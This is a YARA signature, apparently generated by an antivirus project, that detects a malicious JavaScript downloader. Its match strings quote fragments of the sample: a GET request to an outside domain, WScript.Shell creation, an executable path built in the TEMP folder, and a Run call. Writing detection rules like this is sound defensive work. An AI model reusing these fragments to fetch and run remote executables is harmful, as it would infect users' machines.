rule sig_20160330_e159fb874df7d72d7850007f545c7458 {
  meta:
    description = "datamaliciousorder - file 20160330_e159fb874df7d72d7850007f545c7458.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94e16ab66266e6af9c3184cb41f7c1f194623708a5a5b0cbe8b26b5f2ad82270"

  strings:
    $s1  = "_N0[_AN](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "var _PS = function _IF() {return WScript[_G](\"WScript\"+\".Shell\");}(), _L0 = 11;" fullword ascii
    $s3  = "function _W(_VN, _C2){_C0 = _C0 * 1; return _VN - _C2;};" fullword ascii
    $s4  = "if (_N0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _C(){return _G0 + \"\";};" fullword ascii
    $s6  = "function _SW() {return _PS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"T11i5pV82ohm.ex\" + \"e\";};" fullword ascii
    $s7  = "function _T() {return ((_BW == true) && (_BW == _Z1)) ? 1 : _C0;};" fullword ascii
    $s8  = "function _I(_Z0){_PS[\"Run\"](_Z0, _C0, _C0);};" fullword ascii
    $s9  = "function _O(){return 22;};" fullword ascii
    $s10 = "var _N = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_Z){" fullword ascii
    $s12 = "function _L(){return _G;};" fullword ascii
    $s13 = "function _DD()" fullword ascii
    $s14 = "return _W(_SO, _NA);" fullword ascii
    $s15 = "function _UV(_I0) {var _GI = (1, 2, 3, 4, 5, _I0); return _GI;};" fullword ascii
    $s16 = "var _Z1 = false;" fullword ascii
    $s17 = "_BW = true; " fullword ascii
    $s18 = "var _MW = false;" fullword ascii
    $s19 = "var _BW = false;" fullword ascii
    $s20 = "_Z1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}